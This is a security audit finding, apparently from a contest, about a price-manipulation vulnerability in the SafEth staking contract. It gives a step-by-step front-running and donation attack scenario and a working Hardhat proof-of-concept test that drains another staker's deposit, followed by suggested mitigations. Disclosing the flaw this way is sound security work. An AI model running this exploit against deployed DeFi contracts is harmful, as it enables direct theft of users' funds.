### Exploitable price manipulation vulnerability in SafEth staking

**Context:** [SafEth.sol](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L71-L81) 

**Description:**

The code vulnerability allows for the direct theft of funds from other stakers in a derivative-based system. The stake function calculates the price of the safEth token based on the underlying value of derivatives. External manipulation of underlying values and depositors' influence on total supply can lead to an attack. The attack involves manipulating the underlying value to increase the price, followed by unstaking a small amount to profit from the price discrepancy. To mitigate this, implementing a lock mechanism and averaging the price over a certain period are recommended.


**Impact:**

Direct theft of funds from other stakers

**Proof of Concept**

The "stake" function allows external users to stake funds into a system of derivatives in exchange in safEth. The function first performs a few checks on the staking request to ensure that it meets certain criteria, such as minimum and maximum values.

The function then calculates the underlying value of each derivative object in terms of ETH, using a for loop to iterate over each object in an array. The total underlying value is then used to calculate the pre-deposit price of the safETH token.

The underlying value is calculated using the formula 
`(ethPerDerivative / the balance of the derivative) / 1e18`

The balance of the derivative is fetched in each function by calling the underlying token of the derivative, e.g. `IERC20(underlying).balanceOf(address(this));` [1](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L122-L124), [2](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L93-L95), [3](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L221-L223)  - where the implementation of `ethPerDerivative` can vary. [1](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/Reth.sol#L211-L215), [2](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/SfrxEth.sol#L111-L117), [3](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/derivatives/WstEth.sol#L86-L88)

After that, if the supply is zero it initializes it with a price of 1 otherwise, it calculates it with the following formula:

`(10 ** 18 * underlyingValue) / totalSupply`.

However, because underlyingValue can be influenced externally and depositors can influence the totalSupply, this can lead to a complex attack vector which would result into theft of funds for other depositors.

<u>Consider the following scenario:</u> 

Bob deposits 0.5e18 (because there's a min deposit requirement) and receives 0,5001992725 safEth in exchange.

Now, if Alice is to stake 200e18, the price would be 1000000006116652746 and she would receive 200079708657045533684 safEth in exchange.

However, Bob has another plan. Immediately after his staking, he unstakes 0.5e18 - 1 wei, which leaves him with just 1 safEth.

Now if Alice is to stake -
underlyingValue equal 2
totalSupply would equal 1

Now if she stakes 200e18, the price equals `( 1e18 * 2 ) / 2` , hence she would get 100039855415051776431 safEth in exchange, which is not a problem **yet**, because she can withdraw them with a very minimal difference (~0.25e18), so Alice decides to proceed.

When Alice submits her transaction, Bob immediately notices it in the mempool and generously donates 100e18 to the SfrxEth derivative and the WstETH derivative, which directly would manipulate [this](https://github.com/code-423n4/2023-03-asymmetry/blob/44b5cd94ebedc187a08884a7f685e950e987261c/contracts/SafEth/SafEth.sol#L71-L81) computation.

```solidity
    // Getting underlying value in terms of ETH for each derivative
    for (uint i = 0; i < derivativeCount; i++)
      underlyingValue +=
        (derivatives[i].ethPerDerivative(derivatives[i].balance()) *
          derivatives[i].balance()) /
        10 ** 18;

    uint256 totalSupply = totalSupply();
    uint256 preDepositPrice; // Price of safETH in regards to ETH
  
    if (totalSupply == 0)
      preDepositPrice = 10 ** 18; // initializes with a price of 1
    else preDepositPrice = (10 ** 18 * underlyingValue) / totalSupply;
```

Now that `underlyingValue` is manipulated, the price equals the astonishing 100079713278686337891000000000000000000, so as a result Alice gets only 1 safEth in exchange.

Bob, knowing what happened is very quick to unstake his 1 safEth, which yields him ~ 49,80 ETH profit.

To prove this, I've built a PoC using the test suite of the protocol, with two very small modifications so it's easier to use.

I've added this function to WstEth and SfrxEth in order to simulate Bob's donation easier.
```solidity
  function feedMe () external payable {
    (bool sent, ) = WST_ETH.call{ value: msg.value }("");
  }
```

And additionally, I have set Reth's weight to 0 just to simplify the example.


```typescript
it("Direct theft of funds", async function () {
      const startingBalance = await adminAccount.getBalance();
      console.log("Bob balance before attack:",ethers.utils.formatEther(startingBalance));
      await safEthProxy.connect(adminAccount).stake({ value: ethers.utils.parseEther("0.5") });
      let balance = await safEthProxy.balanceOf(adminAccount.address)

      await safEthProxy.connect(adminAccount).unstake(
        balance.sub(1)
      );      

      let der1 = await safEthProxy.derivatives(1);
      let der2 = await safEthProxy.derivatives(2);

      const iface = new ethers.utils.Interface(['function feedMe()']);
      const data = iface.encodeFunctionData('feedMe');

      // SfrxEth
      await adminAccount.sendTransaction({
        data: data,
        to: der1,
        value: ethers.utils.parseEther("100")
      })

      // WstETH
      await adminAccount.sendTransaction({
        data: data,
        to: der2,
        value: ethers.utils.parseEther("100")
      })


      console.log("Alice balance before staking:",ethers.utils.formatEther(await alice.getBalance()));
      await safEthProxy.connect(alice).stake({ value: ethers.utils.parseEther("200") });
      let aliceSafEthBalance = await safEthProxy.balanceOf(alice.address);
      

      await safEthProxy.connect(adminAccount).unstake(1);

      console.log("Bob balance after attack:",ethers.utils.formatEther(await adminAccount.getBalance()));

      await safEthProxy.connect(alice).unstake(aliceSafEthBalance);

      console.log("Alice balance after unstaking:",ethers.utils.formatEther(await alice.getBalance()));
    
    });
```

Running `yarn hardhat test ./test/SafEth.test.ts --grep "Direct theft of funds"` in the console, yields the following result.

**Recommended Mitigation Steps**

These types of attacks always have different nuances and variations, so in general its not recommended to rely on external calls that can be unexpectedly manipulated. 

1. Implement a lock mechanism: Introduce a lock mechanism that prevents users from unstaking their funds immediately after staking. This can be done by setting a minimum lock duration, during which users cannot unstake their funds. This will prevent attackers from manipulating the underlying value and total supply in the short term.
2. Average the price over a certain period: Instead of using the current underlying value and total supply to determine the price, use a moving average of the price over a certain period. This would reduce the effect of sudden changes in the underlying value and total supply on the price calculation.
